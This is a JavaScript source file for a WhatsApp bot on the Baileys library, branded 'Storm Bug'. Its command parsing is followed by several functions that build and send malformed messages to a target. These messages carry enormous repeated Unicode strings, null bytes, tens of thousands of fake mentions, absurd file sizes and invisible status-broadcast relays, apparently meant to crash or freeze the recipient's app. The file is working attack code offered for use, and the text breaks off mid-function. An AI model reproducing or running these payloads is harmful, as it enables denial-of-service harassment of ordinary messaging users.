require('./setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = prim = async (prim, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? prim.user.id.split(":")[0] + "@s.whatsapp.net" || prim.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

const image = fs.readFileSync('./media/storm.jpg')
const kontributor = JSON.parse(fs.readFileSync('./lib/database/owner.json'));

const botNumber = await prim.decodeJid(prim.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await prim.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Media
const babi = fs.readFileSync('./media/bug.jpeg')
const musicprim = fs.readFileSync('./media/menu.mp3')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`𝗧𝗵𝗲 𝗙𝗹𝗮𝘀𝗵 𝗧𝗲𝘅𝘁`));
console.log(
chalk.bgHex("#FF0000").black(
`  👤 Date: ${new Date().toLocaleString()} \n` +
`  👤 Chat: ${m.body || m.mtype} \n` +
`  👤 Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FF0000").black(
`   👤 Group: ${groupName} \n` +
`   👤 GroupJid: ${m.chat}`
)
);
}
console.log();
}
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

async function loadmenugoz () {
var baralod = [
"𝙒𝘼𝙄𝙏 𝙏𝙊 𝙈𝙄𝙉𝙐𝙏𝙀.....",
"ᖫ𝐒𝐓𝐎𝐑𝐌 ⚡ 𝐂𝐑𝐀𝐒𝐇 √1ᖭ", 
]
let { key } = await prim.sendMessage(from, {text: 'Storm'})

for (let i = 0; i < baralod.length; i++) {
await prim.sendMessage(from, {text: baralod[i], edit: key });
}
}

// Func delay new

async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `In Scorpio Locked You Device`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "Mr Storm" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    prim.relayMessage(target, messagePayload, {}, { messageId: null });
}

async function invico1(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363404759959596@newsletter",
      newsletterName: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⿻" + "ោ៝".repeat(10000),
      caption: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await prim.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}
async function invisiblenew(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠 ",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await prim.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "INVISIBLE -𝟗𝟕𝟒𝟏" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function InVisibleX1(target, show) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "𑲭𑲭⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠 ⍣𐎟𑆻",
                    footerText: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⍣ ",
                    buttons: [
                        {
                            buttonId: ".aboutb",
                            buttonText: {
                                displayText: "𐎟𑆻⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⍣ 𐎟𑆻 " + "\u0000".repeat(900000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await prim.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await prim.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 15,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: {
                                    is_status_mention: "𐎟𑆻⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠⍣𐎟𑆻⃔‌",
                                },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function protocol6(target, mention) {
  const quotedMessage = {
    extendedTextMessage: {
      text: "᭯".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0000".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "BoomXSuper",
          body: "\u0000".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
        },
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
      }
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "💥".repeat(1770),
      serviceType: 1
    }
  };

  const mentionedList = [
  "13135550002@s.whatsapp.net",
  ...Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".SurzHeree" + "ោ៝".repeat(1000),
    title: "MegumiAgency",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://n.uguu.se/BvbLvNHY.jpg",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "109951162777600",
    seconds: 999999,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "ꦾ".repeat(1277),
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        title: "☠️ - んジェラルド - ☠️",
        body: "\u0000".repeat(9117),
        mediaType: 1,
        renderLargerThumbnail: true,
        thumbnailUrl: null,
        sourceUrl: "https://" + "ꦾ".repeat(100) + ".com/"
      },
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      quotedMessage,
      isSampled: true,
      mentionedJid: mentionedList
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "ꦾ".repeat(100)
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await prim.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}
async function NotifFreeze(target) {
      prim.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "prim.com" + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Neobest.cloud.com" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
async function prim5(target, Ptcp = true) {
    let virtex = "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠" + "ꦾ".repeat(49000);
    await prim.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "\u0009".repeat(100),
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "\u0009" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function protocolbug5(target, mention) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Primis Is herre" + "ោ៝".repeat(10000),
        title: "Megumi",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𐌖𐌉𐌍𐌂𐍃 ✦ 𐌔𐌖𐍀𐌄𐍂𐌍𐌰𐌙𐍂",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "⚡ 𝐒𝐭𝐨𝐫𝐦 𝐁𝐮𝐠"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await prim.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolbug4(target, mention) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `>_<\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await prim.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "TACHI" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function protocolbug3(target, mention) {
    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
                    fileLength: "999999",
                    seconds: 999999,
                    mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
                    caption: "\u9999",
                    height: 999999,
                    width: 999999,
                    fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
                    directPath: "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1743742853",
                    contextInfo: {
                        isSampled: true,
                        mentionedJid: [
                            "13135550002@s.whatsapp.net",
                            ...Array.from({ length: 30000 }, () =>
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                            )
                        ]
                    },
                    streamingSidecar: "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
                    thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                    thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                    thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                    annotations: [
                        {
                            embeddedContent: {
                                embeddedMusic: {
                              musicContentMediaId: "kontol",
                                    songId: "peler",
                                    author: "\u9999",
                                    title: "\u9999",
                                    artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                    artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
                                    countryBlocklist: true,
                                    isExplicit: true,
                                    artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                                }
                            },
                            embeddedAction: null
                        }
                    ]
                }
            }
        }
    }, {});

    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
